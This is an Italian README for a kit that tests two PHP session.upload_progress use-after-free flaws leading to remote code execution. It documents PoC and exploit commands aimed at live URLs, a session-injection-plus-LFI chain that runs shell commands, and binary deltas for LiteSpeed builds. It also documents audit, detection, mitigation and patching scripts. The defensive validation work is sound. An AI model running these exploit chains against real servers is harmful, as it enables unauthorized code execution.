# php-up-2026

Kit di validazione e test per le vulnerabilità **CVE-2026-109618 / CVE-2026-109619** — due bug Use-After-Free nel meccanismo `session.upload_progress` di PHP che consentono **Remote Code Execution (RCE) senza autenticazione** su configurazione di default.

**Severity:** CVSS v4.0 **9.2** (Critical) — vendor php.net  
**Versioni affette:** PHP 5.4.0 → 8.5.x (tutte le versioni con `session.upload_progress`)  
**Fix ufficiali:** PHP 8.2.35, 8.3.36, 8.4.27, 8.5.12 (rilasciati 2026-10-21)  
**PHP 5.x / 7.x / 8.0 / 8.1:** end-of-life, nessun fix ufficiale  

> **Solo per uso interno autorizzato — test difensivi su infrastruttura di proprietà.**

---

## Indice

1. [Cos'è la vulnerabilità](#cosè-la-vulnerabilità)
2. [Struttura del repository](#struttura-del-repository)
3. [Prerequisiti](#prerequisiti)
4. [Quickstart — Verifiche immediate sui server](#quickstart--verifiche-immediate-sui-server)
5. [Lab locale con Docker](#lab-locale-con-docker)
6. [Strumenti nel dettaglio](#strumenti-nel-dettaglio)
7. [Test su target live (autorizzati)](#test-su-target-live-autorizzati)
8. [Catene di attacco testate](#catene-di-attacco-testate)
9. [Mitigazione](#mitigazione)
10. [Documentazione tecnica](#documentazione-tecnica)
11. [Credits](#credits)

---

## Cos'è la vulnerabilità

PHP tiene in memoria due puntatori (`zval *`) che puntano dentro un HashTable di sessione. Quando il meccanismo `session.upload_progress` riscrive la sessione (il secondo `update()` dopo il `min_freq` di 1 secondo), il vecchio albero di sessione viene distrutto (`zval_ptr_dtor`) ma i due puntatori **non vengono aggiornati** → puntano a memoria liberata (Use-After-Free).

Un attaccante può:
- **Iniettare codice PHP** nel file di sessione tramite il campo `filename` di un upload multipart (funziona su qualsiasi PHP, senza UAF)
- Se presente una **Local File Inclusion (LFI)** nell'applicazione → **RCE** includendo il file di sessione
- Sfruttare l'UAF con **heap spray** (149 elementi `t[]` → reclaim della memoria liberata) per eseguire `system()` → **RCE diretto** senza bisogno di LFI (richiede il delta specifico del binario PHP del target)

**Requisiti per l'attaccante:**
- Qualsiasi endpoint PHP che accetti POST (non serve upload, non serve autenticazione)
- `session.upload_progress.enabled = On` (default su tutte le installazioni PHP)

---

## Struttura del repository

```
php-up-2026/
│
├── bin/                            # Strumenti principali
│   ├── php_up_framework.py         # Framework unificato (validate/build/deliver/extract)
│   ├── poc0_109618.py              # PoC standalone — bug "outer" (post_bytes_processed)
│   ├── poc1_109619.py              # PoC standalone — bug "inner" (current_file_bytes_processed)
│   ├── poc_trigger.py              # Trigger minimale (258 byte, il payload esatto del writeup)
│   ├── rce_poc.py                  # PoC RCE completo (crash UAF + session injection + LFI)
│   ├── server_audit.sh             # Audit di sicurezza completo per server in produzione
│   └── php_update_plesk.sh         # Aggiornamento PHP per server Plesk (update + riavvio)
│
├── check_vuln.sh                   # Check rapido: il mio PHP è vulnerabile?
├── mitigate_apache.sh              # Applicazione automatica mitigazione Apache (.htaccess)
├── test_matrix.sh                  # Test multi-versione PHP via Docker (7.4 → 8.4)
├── test_live_target.sh             # Test a 3 livelli contro un server reale (proprio)
│
├── lab/                            # Ambiente Docker vulnerabile per test locali
│   ├── Dockerfile                  #   Apache + mod_php 8.2 (lab HTTP)
│   ├── Dockerfile.fpm              #   php-fpm 8.2 (lab FCGI)
│   ├── entrypoint.sh               #   Estrazione simboli + avvio FPM
│   └── webroot/                    #   File PHP del lab
│       ├── index.php               #     Endpoint base con session_start()
│       ├── info.php                #     Dump configurazione session/upload_progress
│       └── session_dump.php        #     Visualizzazione contenuto file di sessione
│
├── public_pocs/                    # PoC di terze parti (ricerca pubblica)
│   ├── exploit_chain_a.py          #   Chain A completa: injection + LFI → RCE
│   ├── run_all_pocs.py             #   Harness che esegue tutte e 4 le chain (A/B/C/D)
│   ├── lab_http/                   #   Lab Docker per le chain pubbliche
│   │   ├── Dockerfile              #     Apache 8.2 con LFI attiva
│   │   └── webroot/
│   │       ├── index.php
│   │       ├── info.php
│   │       ├── session_dump.php
│   │       └── vuln_lfi.php        #     Simulazione LFI (include arbitrario)
│   └── php2shell-poc/              #   Clone del repo ikow/php2shell-poc (ricerca Qi Deng)
│       ├── poc/
│       │   ├── verify_session_injection.py
│       │   ├── verify_uaf_asan.php
│       │   └── verify_handler_mismatch.py
│       ├── docs/
│       │   ├── ANALYSIS.md
│       │   └── substack_article.md
│       └── README.md
│
├── deltas/                         # Simboli di debug per LiteSpeed lsphp82 8.2.34
│   ├── lsphp82-8.2.34-1-bookworm.zval.debug
│   ├── lsphp82-8.2.34-1-noble.zval.debug
│   └── lsphp82-8.2.34-1-jammy.zval.debug
│
└── docs/                           # Documentazione tecnica e report
    ├── VALIDATION.md               # Verifica source-line di ogni claim del writeup
    ├── REPORT_VALIDATION.md        # Report di validazione completo + runbook
    ├── RATING.md                   # Classificazione CVSS e severity
    ├── DELTAS_LSphp.md             # Tabella delta per LiteSpeed 8.2.34
    ├── INCIDENT_RECON.md           # Guida incident response (comandi per verificare compromissione)
    └── README_FRAMEWORK.md         # Documentazione del framework principale
```

---

## Prerequisiti

- **Python 3.8+** (tutti gli script sono stdlib-only, nessun `pip install`)
- **Bash** (per gli script `.sh`)
- **Docker** (solo per il lab locale e `test_matrix.sh`)
- **curl** (per i check rapidi)
- **nm** o **readelf** (per l'estrazione simboli con `--syms`)

---

## Quickstart — Verifiche immediate sui server

### 1. Verificare se un server è vulnerabile (read-only)

Copiare `check_vuln.sh` sul server ed eseguire:

```bash
bash check_vuln.sh
```

Output: per ogni binario PHP trovato, indica se è VULNERABILE, MITIGATO o PATCHATO.
Controlla automaticamente la versione, `upload_progress.enabled`, processi PHP attivi e porte web.

### 2. Audit di sicurezza completo (server in produzione)

Copiare `bin/server_audit.sh` sul server ed eseguire come root:

```bash
sudo bash server_audit.sh
# Opzioni:
#   --webroot /var/www/html     (default: /var/www)
#   --log-dir /var/log/nginx    (auto-detect se omesso)
#   --days 7                    (giorni indietro per file recenti)
#   --report audit_report.txt   (salva su file)
```

Esegue 9 categorie di controlli:
1. **PHP Environment** — versione, SAPI, configurazione sessioni
2. **Session File Analysis** — cerca `<?php`, `system()`, `eval()` nei file di sessione
3. **Log Analysis** — pattern LFI, path traversal, PHP wrapper abuse, POST anomali
4. **Crash Analysis** — segfault/SIGSEGV di PHP in dmesg/syslog
5. **Webshell Scan** — pattern webshell nella webroot
6. **Suspicious Recent Files** — PHP in /tmp, nuovi file SUID
7. **Processes & Network** — processi PHP sospetti, connessioni outbound, porte C2
8. **Users & Persistence** — utenti UID 0, chiavi SSH, crontab sospette, servizi systemd
9. **Mitigation Status** — checklist delle mitigazioni applicate

Produce un verdetto finale: `CLEAN`, `EXPOSED`, `ATTACKED`, o `COMPROMISED`.

### 3. Self-test del framework

```bash
cd bin
python3 php_up_framework.py --selftest
```

Verifica che le strutture forge/body siano corrette senza contattare nessun server.

---

## Lab locale con Docker

### Lab Apache + mod_php (per Chain A — session injection + LFI)

```bash
cd public_pocs/lab_http
docker build -t php-vuln-http .
docker run -d --name php-vuln-http -p 18080:80 php-vuln-http
```

Endpoint disponibili:
- `http://127.0.0.1:18080/index.php` — endpoint con `session_start()`
- `http://127.0.0.1:18080/info.php` — dump configurazione
- `http://127.0.0.1:18080/session_dump.php?sid=<id>` — contenuto file di sessione
- `http://127.0.0.1:18080/vuln_lfi.php?page=/path` — simulazione LFI

### Lab php-fpm (per Chain D — heap UAF con FCGI)

```bash
cd lab
docker build -f Dockerfile.fpm -t php-vuln-fpm .
docker run -d --name php-vuln-fpm -p 19000:9000 php-vuln-fpm
```

All'avvio il container stampa i simboli estratti:
```
zval_ptr_dtor=0x...
zend_call_function=0x...
delta=0x...
```

### Test su tutti i lab contemporaneamente

```bash
cd public_pocs
python3 run_all_pocs.py
```

Esegue le 4 chain di attacco (A/B/C/D) contro entrambi i container e produce un report con PASS/FAIL per ogni chain.

### Test matrix multi-versione

```bash
bash test_matrix.sh
```

Avvia container Docker per PHP 7.4, 8.0, 8.1, 8.2, 8.3, 8.4, esegue `check_vuln.sh` e il trigger PoC su ciascuno, e produce una tabella riepilogativa. Richiede Docker.

---

## Strumenti nel dettaglio

### `bin/php_up_framework.py` — Framework principale

Il tool centrale del repository. Quattro modalità:

| Modalità | Comando | Cosa fa |
|---|---|---|
| **Self-test** | `--selftest` | Verifica integrità forge/body (nessun server) |
| **Estrazione simboli** | `--syms --binary /path/php` | Estrae `zval_ptr_dtor`, `zend_call_function` e delta da un binario o file `.debug` |
| **Build** | `--build --bug 618\|619 --dtor <hex> --out body.bin` | Genera il payload multipart su file |
| **Lab** | `--lab --bug 618\|619 --dtor <hex>` | Invia il payload via FCGI al lab php-fpm |
| **Live** | `--live URL --bug 618\|619 --dtor <hex>` | Invia il payload via HTTPS al target |

Esempio — estrarre i delta dal file di debug LiteSpeed:
```bash
python3 bin/php_up_framework.py --syms --binary deltas/lsphp82-8.2.34-1-bookworm.zval.debug
```

### `bin/poc0_109618.py` e `bin/poc1_109619.py` — PoC standalone

Due PoC indipendenti per i due bug:

| Script | Bug | Puntatore stale | Meccanismo |
|---|---|---|---|
| `poc0_109618.py` | CVE-2026-109618 | `post_bytes_processed` (outer) | 2 file, 149 `t[]` dopo il primo file |
| `poc1_109619.py` | CVE-2026-109619 | `current_file_bytes_processed` (inner) | 1 file, 149 `t[]` prima del file |

Uso:
```bash
# Dry run (genera il body su file senza inviare)
python3 bin/poc0_109618.py https://target/index.php --dtor 0x... --dry

# Invio al target
python3 bin/poc0_109618.py https://target/index.php --dtor 0x... --stall 1.4
```

### `bin/poc_trigger.py` — Trigger minimale (258 byte)

Il payload esatto del writeup originale. Non contiene heap spray né forging, serve solo a verificare che il code path vulnerabile sia raggiungibile e (con ASAN) a provocare il crash.

```bash
# Self-test
python3 bin/poc_trigger.py --self-test

# Invio al target
python3 bin/poc_trigger.py --host 127.0.0.1 --port 19268
```

### `bin/rce_poc.py` — PoC RCE completo

Dimostra l'intera catena: crash UAF → session injection → LFI → esecuzione comando.

```bash
# Solo crash (dimostra UAF)
python3 bin/rce_poc.py --host 127.0.0.1 --port 19000 --crash-only

# RCE completo (richiede lab con vuln_lfi.php)
python3 bin/rce_poc.py --host 127.0.0.1 --port 19000 --command "id > /tmp/PWNED"
```

### `bin/server_audit.sh` — Audit server produzione

Vedi [sezione Quickstart](#2-audit-di-sicurezza-completo-server-in-produzione).

### `check_vuln.sh` — Check rapido vulnerabilità

Vedi [sezione Quickstart](#1-verificare-se-un-server-è-vulnerabile-read-only).

### `mitigate_apache.sh` — Mitigazione automatica Apache

Inserisce regole `.htaccess` (mod_rewrite) che bloccano tutti i POST `multipart/form-data`.

```bash
# Solo verifica se la mitigazione è attiva
bash mitigate_apache.sh --check

# Applica la regola (richiede root)
sudo bash mitigate_apache.sh

# Rimuovi la regola (dopo aver patchato PHP)
sudo bash mitigate_apache.sh --remove
```

> **Attenzione:** questa regola blocca TUTTI gli upload di file. Usarla solo come mitigazione temporanea fino all'aggiornamento di PHP.

### `bin/php_update_plesk.sh` — Aggiornamento PHP per Plesk

Aggiorna tutte le versioni PHP installate su un server Plesk Obsidian alle versioni patchate per CVE-2026-109618/619. Basato su [`php_update.sh`](https://github.com/giagara/php-cves-labs/blob/main/bin/php_update.sh), adattato per i percorsi e i pacchetti Plesk.

```bash
# Solo verifica (read-only, non modifica nulla)
sudo bash bin/php_update_plesk.sh --check

# Dry-run (mostra cosa farebbe)
sudo bash bin/php_update_plesk.sh --dry-run

# Aggiornamento completo + riavvio servizi
sudo bash bin/php_update_plesk.sh
```

Lo script esegue 9 step:
1. **Stato attuale** — rileva tutte le versioni in `/opt/plesk/php/` e confronta con le versioni patchate
2. **Aggiornamento indice** — `apt-get update` o `yum makecache`
3. **Aggiornamento pacchetti** — aggiorna solo i pacchetti `plesk-phpXY-*` già installati (non installa versioni nuove, mantiene i php.ini con `--force-confold`)
4. **Riavvio PHP-FPM** — riavvia i servizi `plesk-phpXY-fpm`
5. **Riavvio web server** — reload di Apache/nginx
6. **Riavvio supervisor** — restart di Horizon, Reverb, Octane, code worker
7. **Verifica post-update** — confronta CLI e FPM con le versioni minime
8. **Processi stale** — cerca processi PHP ancora sul binario vecchio (`(deleted)`)
9. **Mitigazione EOL** — per PHP 7.x/8.0/8.1 verifica che `upload_progress.enabled=Off`

Supporta **apt** (Debian/Ubuntu), **yum** e **dnf** (CentOS/AlmaLinux/Rocky).

### `public_pocs/exploit_chain_a.py` — Chain A (injection + LFI)

```bash
# Solo probe (verifica se la session injection funziona)
python3 public_pocs/exploit_chain_a.py --target https://myserver.com --probe

# RCE via LFI
python3 public_pocs/exploit_chain_a.py --target https://myserver.com \
    --lfi /vuln.php --cmd "id"

# Scrivere un file sul target
python3 public_pocs/exploit_chain_a.py --target https://myserver.com \
    --lfi /vuln.php --write /tmp/PWNED
```

---

## Test su target live (autorizzati)

Lo script `test_live_target.sh` offre 3 livelli progressivi di test:

| Livello | Cosa invia | Cosa dimostra | Rischio |
|---|---|---|---|
| **1** | Trigger minimale 258B + stall | Raggiungibilità del code path | Basso — nessun crash atteso |
| **2** | Trigger + heap spray (149 elementi) | Pattern exploit + possibile crash worker | Medio — può crashare un worker |
| **3** | Exploit completo con delta reale | RCE (richiede `--dtor`) | Alto — esegue un comando |

```bash
# Livello 1 — solo trigger
bash test_live_target.sh --url https://myserver.com/index.php --level 1

# Livello 2 — trigger + spray (default)
bash test_live_target.sh --url https://myserver.com/index.php

# Livello 3 — exploit completo (richiede il delta del binario)
bash test_live_target.sh --url https://myserver.com/index.php --dtor 0x51e410 --level 3
```

Ogni esecuzione salva un report in `live_test_<timestamp>.txt`.

---

## Catene di attacco testate

| Chain | Tipo | Cosa serve | Script |
|---|---|---|---|
| **A** | Session Injection + LFI → RCE | `upload_progress=On` + una LFI nell'app | `exploit_chain_a.py`, `rce_poc.py` |
| **B** | var_destroy UAF (__destruct reentry) | `unserialize()` nell'app | `run_all_pocs.py` |
| **C** | Session Fixation via POST | `use_only_cookies=Off` | `run_all_pocs.py` |
| **D** | Heap UAF → forged zend_call_function | Delta specifico del binario PHP | `poc0_109618.py`, `poc1_109619.py`, `php_up_framework.py` |

---

## Mitigazione

### Mitigazione immediata (senza patch)

Aggiungere al `php.ini` (o al pool FPM):

```ini
session.upload_progress.enabled = Off
session.use_only_cookies = On
```

Poi:
```bash
systemctl reload php*-fpm
# oppure
systemctl restart apache2
```

### Mitigazione Apache (blocco POST multipart a livello webserver)

```bash
sudo bash mitigate_apache.sh
```

### Fix definitivo

Aggiornare PHP all'ultima versione patchata:
- PHP 8.2.35+
- PHP 8.3.36+
- PHP 8.4.27+
- PHP 8.5.12+

Per PHP 5.x, 7.x, 8.0, 8.1 (end-of-life): **la mitigazione `upload_progress.enabled=Off` è l'unica opzione**.

---

## Documentazione tecnica

| Documento | Contenuto |
|---|---|
| [docs/VALIDATION.md](docs/VALIDATION.md) | Verifica source-line di tutti i claim del writeup contro php-src 8.4 |
| [docs/REPORT_VALIDATION.md](docs/REPORT_VALIDATION.md) | Report di validazione completo, evidenze lab, runbook operativo |
| [docs/RATING.md](docs/RATING.md) | Classificazione CVSS, confidence, severity |
| [docs/DELTAS_LSphp.md](docs/DELTAS_LSphp.md) | Tabella delta `zval_ptr_dtor - zend_call_function` per LiteSpeed 8.2.34 |
| [docs/INCIDENT_RECON.md](docs/INCIDENT_RECON.md) | Guida incident response: comandi per verificare se un server è stato attaccato |
| [docs/README_FRAMEWORK.md](docs/README_FRAMEWORK.md) | Documentazione dettagliata del framework `php_up_framework.py` |

### Delta noti (zval_ptr_dtor - zend_call_function)

| Build | delta_call |
|---|---|
| LiteSpeed lsphp82 8.2.34 — Bookworm | `0xc930` |
| LiteSpeed lsphp82 8.2.34 — Noble | `0xcef0` |
| LiteSpeed lsphp82 8.2.34 — Jammy | `0xd060` |

Per estrarre il delta da un qualsiasi binario PHP:
```bash
python3 bin/php_up_framework.py --syms --binary /path/to/php-fpm
```

---

## Credits

| Ruolo | Chi |
|---|---|
| Code / Framework | J4ck3LSyN (@J4ck3LSyN) |
| PoC | Andrew Dorman (@acd421) |
| Research | Arch&Yuki (@ArchKnight23) |
| Assist | A.T.L.A.S |
| Ricerca pubblica (php2shell-poc) | Qi Deng (@ikow) |

---

**Solo per uso difensivo autorizzato. Non utilizzare contro sistemi di cui non si ha l'autorizzazione esplicita al test.**
